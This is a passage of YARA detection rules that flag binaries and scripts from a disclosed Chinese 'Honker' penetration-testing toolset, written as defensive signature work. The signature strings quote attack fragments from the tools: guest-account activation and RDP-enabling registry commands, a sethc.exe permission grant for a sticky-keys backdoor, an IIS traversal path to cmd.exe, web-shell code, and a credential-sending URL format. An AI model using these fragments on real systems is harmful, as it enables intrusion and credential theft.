      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:15:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "IP - %d; Login - %d; Password - %d; Combination - %d" fullword ascii
      $s3 = "Create %d IP@Loginl;Password" fullword ascii
      $s15 = "UBrute.com" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 980KB and 2 of them
} 

rule CN_Honker_hkmjjiis6_RID2E56 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file hkmjjiis6.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:10:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s14 = "* FROM IIsWebInfo/r" fullword ascii
      $s19 = "ltithread4ck/" fullword ascii
      $s20 = "LookupAcc=Sid#" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 175KB and all of them
} 

rule CN_Honker_clearlogs_RID2E83 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file clearlogs.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:17:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "- http://ntsecurity.nu/toolbox/clearlogs/" fullword ascii
      $s4 = "Error: Unable to clear log - " fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 140KB and all of them
} 

rule CN_Honker_no_net_priv_esc_AddUser_RID340B : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file AddUser.dll"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:13:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "PECompact2" fullword ascii
      $s1 = "adduser" fullword ascii
      $s5 = "OagaBoxA" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 115KB and all of them
} 

rule CN_Honker_Injection_RID2E6A : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Injection.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:13:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "http://127.0.0.1/6kbbs/bank.asp" fullword ascii
      $s7 = "jmPost.asp" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 220KB and all of them
} 

rule CN_Honker_SQLServer_inject_Creaked_RID3418 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file SQLServer_inject_Creaked.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:15:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "http://localhost/index.asp?id=2" fullword ascii
      $s2 = "Email:zhaoxypass@yahoo.com.cn<br>" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 8110KB and all of them
} 

rule CN_Honker_WebScan_WebScan_RID306C : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file WebScan.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:39:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "wwwscan.exe" fullword wide
      $s2 = "WWWScan Gui" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and all of them
} 

rule CN_Honker_GetHashes_2_RID2ED4 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file GetHashes.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:31:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "GetHashes.exe <SAM registry file> [System key file]" fullword ascii
      $s2 = "GetHashes.exe $Local" fullword ascii
      $s3 = "The system key doesn't match SAM registry file!" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 2 of them
} 

rule Generic_KeyGen_Patcher_RID2F96 : DEMO EXE FILE GEN HKTL T1136 {
   meta:
      description = "Keygen from CN Honker Pentest Toolset - file Acunetix_Web_Vulnerability_Scanner_8.x_Enterprise_Edition_KeyGen.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:03:31"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, GEN, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<description>Patch</description>" fullword ascii
      $s2 = "\\dup2patcher.dll" fullword ascii
      $s3 = "load_patcher" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them
} 

rule CN_Honker_net_packet_capt_RID30EC : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file net_packet_capt.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:00:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "(*.sfd)" fullword ascii
      $s2 = "GetLaBA" fullword ascii
      $s3 = "GAIsProcessorFeature" fullword ascii
      $s4 = "- Gablto " ascii
      $s5 = "PaneWyedit" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them
} 

rule CN_Honker_CleanIISLog_RID2EB1 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file CleanIISLog.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:25:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Usage: CleanIISLog <LogFile>|<.> <CleanIP>|<.>" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them
} 

rule CN_Honker_HASH_pwhash_RID2ED5 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file pwhash.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:31:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Example: quarks-pwdump.exe --dump-hash-domain --with-history" fullword ascii
      $s2 = "quarks-pwdump.exe <options> <NTDS file>" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of them
} 

rule CN_Honker_SqlMap_Python_Run_RID318A : CHINA DEMO EXE FILE HKTL SCRIPT T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Run.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:26:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, SCRIPT, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".\\Run.log" fullword ascii
      $s2 = "[root@Hacker~]# Sqlmap " fullword ascii
      $s3 = "%sSqlmap %s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them
} 

rule CN_Honker_SAMInside_RID2E04 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file SAMInside.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:56:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "www.InsidePro.com" fullword wide
      $s1 = "SAMInside.exe" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 650KB and all of them
} 

rule CN_Honker_WebScan_wwwscan_RID30D3 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file wwwscan.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:56:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%s www.target.com -p 8080 -m 10 -t 16" fullword ascii
      $s2 = "GET /nothisexistpage.html HTTP/1.1" fullword ascii
      $s3 = "<Usage>:  %s <HostName|Ip> [Options]" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them
} 

rule CN_Honker_sig_3389_2_3389_RID2F07 : CHINA DEMO EXE FILE HKTL T1087 T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file 3389.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:39:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1087, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "C:\\Documents and Settings\\Administrator\\" fullword ascii
      $s2 = "net user guest /active:yes" fullword ascii
      $s3 = "\\Microsoft Word.exe" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them
} 

rule CN_Honker_PHP_php11_RID2DB8 : CHINA DEMO HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file php11.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:43:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<tr><td><b><?php if (!$win) {echo wordwrap(myshellexec('id'),90,'<br>',1);} else" ascii
      $s2 = "foreach (glob($_GET['pathtomass'].\"/*.htm\") as $injectj00) {" fullword ascii
      $s3 = "echo '[cPanel Found] '.$login.':'.$pass.\"  Success\\n\";" fullword ascii
   condition: 
      filesize < 800KB and all of them
} 

rule CN_Honker_WebCruiserWVS_RID2FC2 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file WebCruiserWVS.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:10:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "id:uid:user:username:password:access:account:accounts:admin_id:admin_name:admin_" ascii
      $s1 = "Created By WebCruiser - Web Vulnerability Scanner http://sec4app.com" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and all of them
} 

rule CN_Honker_Hookmsgina_RID2ED7 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Hookmsgina.dll"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:31:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\\\.\\pipe\\WinlogonHack" fullword ascii
      $s2 = "%s?host=%s&domain=%s&user=%s&pass=%s&port=%u" fullword ascii
      $s3 = "Global\\WinlogonHack_Load%u" fullword ascii
      $s4 = "Hookmsgina.dll" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them
} 

rule CN_Honker_sig_3389_xp3389_RID2F5E : CHINA DEMO EXE FILE HKTL T1050 T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file xp3389.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:54:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1050, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "echo \"fdenytsconnections\"=dword:00000000 >> c:\\reg.reg" fullword ascii
      $s2 = "echo [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server] >" ascii
      $s3 = "echo \"Tsenabled\"=dword:00000001 >> c:\\reg.reg" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and all of them
} 

rule CN_Honker_CookiesView_RID2F2F : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file CookiesView.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:46:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "V1.0  Http://www.darkst.com Code:New4" fullword ascii
      $s1 = "maotpo@126.com" fullword ascii
      $s2 = "www.baidu.com" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 640KB and all of them
} 

rule CN_Honker_T00ls_Lpk_Sethc_v4_LPK_RID3285 : CHINA DEMO EXE FILE HKTL T1015 T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file LPK.DAT"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:08:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1015, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "http://127.0.0.1/1.exe" fullword wide
      $s2 = "FreeHostKillexe.exe" fullword ascii
      $s3 = "\\sethc.exe /G everyone:F" fullword ascii
      $s4 = "c:\\1.exe" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them
} 

rule CN_Honker_ScanHistory_RID2F3E : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file ScanHistory.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:48:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ScanHistory.exe" fullword wide
      $s2 = ".\\Report.dat" fullword wide
      $s3 = "select  * from  Results order by scandate desc" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them
} 

rule CN_Honker_InvasionErasor_RID307A : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file InvasionErasor.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:41:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "c:\\windows\\system32\\config\\*.*" fullword wide
      $s2 = "c:\\winnt\\*.txt" fullword wide
      $s3 = "Command1" fullword ascii
      $s4 = "Win2003" fullword ascii
      $s5 = "Win 2000" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them
} 

rule CN_Honker_super_Injection1_RID3129 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file super Injection1.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:10:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "Invalid owner=This control requires version 4.70 or greater of COMCTL32.DLL" fullword wide
      $s3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii
      $s4 = "ScanInject.log" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them
} 

rule CN_Honker_Pk_Pker_RID2D73 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Pker.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:32:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "/msadc/..%5c..%5c..%5c..%5cwinnt/system32/cmd.exe" fullword wide
      $s2 = "msadc/..\\..\\..\\..\\winnt/system32/cmd.exe" fullword wide
      $s3 = "--Made by VerKey&Only_Guest&Bincker" fullword wide
      $s4 = ";APPLET;EMBED;FRAMESET;HEAD;NOFRAMES;NOSCRIPT;OBJECT;SCRIPT;STYLE;" fullword wide
      $s5 = " --Welcome to Www.Pker.In Made by V.K" fullword wide
      $s6 = "Report.dat" fullword wide
      $s7 = ".\\Report.dat" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 5 of them
} 

rule CN_Honker_GetPass_GetPass_RID3094 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file GetPass.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:45:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\only\\Desktop\\" ascii
      $s2 = "To Run As Administuor" ascii
      $s3 = "Key to EXIT ... & pause > nul" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them
} 

rule CN_Honker_F4ck_Team_F4ck_3_RID302E : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file F4ck_3.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:28:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "F4ck.exe" fullword wide
      $s2 = "@Netapi32.dll" fullword ascii
      $s3 = "Team.F4ck.Net" fullword wide
      $s6 = "NO Net Add User" fullword wide
      $s7 = "DLL ERROR" fullword ascii
      $s11 = "F4ck Team" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 3 of them
} 

rule CN_Honker_ACCESS_brute_RID2EFA : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file ACCESS_brute.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:37:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".dns166.co" ascii
      $s2 = "SExecuteA" ascii
      $s3 = "ality/clsCom" ascii
      $s4 = "NT_SINK_AddRef" ascii
      $s5 = "WINDOWS\\Syswm" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and all of them
} 

rule CN_Honker_Fpipe_FPipe_RID2EEE : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file FPipe.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:35:31"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Unable to create TCP listen socket. %s%d" fullword ascii
      $s2 = "http://www.foundstone.com" fullword ascii
      $s3 = "%s %s port %d. Address is already in use" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and all of them
} 

rule CN_Honker_Layer_Layer_RID2F20 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Layer.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:43:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\Release\\Layer.pdb" fullword ascii
      $s2 = "Layer.exe" fullword wide
      $s3 = "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them
} 

rule CN_Honker_ms10048_x86_RID2DE9 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file ms10048-x86.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:52:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[+] Set to %d exploit half succeeded" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them
} 

rule CN_Honker_HTran2_4_RID2D69 : CHINA DEMO EXE FILE HKTL T1020 T1090 T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file HTran2.4.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:30:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1020, T1090, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Enter Your Socks Type No: [0.BindPort 1.ConnectBack 2.Listen]:" fullword ascii
      $s2 = "[+] New connection %s:%d !!" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 180KB and all of them
} 

rule CN_Honker_SkinHRootkit_SkinH_RID31CC : CHINA DEMO EXE FILE HKTL T1014 T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file SkinH.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:37:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1014, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "(C)360.cn Inc.All Rights Reserved." fullword wide
      $s1 = "SDVersion.dll" fullword wide
      $s2 = "skinh.dll" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them
} 

rule CN_Honker__PostgreSQL_mysql_injectV1_1_Creak_Oracle_SQLServer_inject_Creaked_RID442C : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - from files PostgreSQL.exe, mysql_injectV1.1_Creak.exe, Oracle.exe, SQLServer_inject_Creaked.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 02:41:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "zhaoxypass@yahoo.com.cn" fullword ascii
      $s2 = "Mozilla/3.0 (compatible; Indy Library)" fullword ascii
      $s3 = "ProxyParams.ProxyPort" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and all of them
} 

rule CN_Honker__wwwscan_wwwscan_wwwscan_gui_RID36A6 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - from files wwwscan.exe, wwwscan.exe, wwwscan_gui.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 17:04:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "GET /nothisexistpage.html HTTP/1.1" fullword ascii
      $s2 = "<Usage>:  %s <HostName|Ip> [Options]" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them
} 

rule CN_Honker__LPK_LPK_LPK_RID2E99 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - from files LPK.DAT, LPK.DAT, LPK.DAT"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:21:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "C:\\WINDOWS\\system32\\cmd.exe" fullword wide
      $s2 = "Password error!" fullword ascii
      $s3 = "\\sathc.exe" fullword ascii
      $s4 = "\\sothc.exe" fullword ascii
      $s5 = "\\lpksethc.bat" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1057KB and all of them
} 

rule CN_Honker__builder_shift_SkinH_RID32C6 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - from files builder.exe, shift.exe, SkinH.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:19:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "lipboard" fullword ascii
      $s2 = "uxthem" fullword ascii
      $s3 = "ENIGMA" fullword ascii
      $s4 = "UtilW0ndow" fullword ascii
      $s5 = "prog3am" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 6075KB and all of them
} 

rule CN_Honker__lcx_HTran2_4_htran20_RID324C : CHINA DEMO EXE FILE HKTL T1020 T1090 T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - from files lcx.exe, HTran2.4.exe, htran20.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:59:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
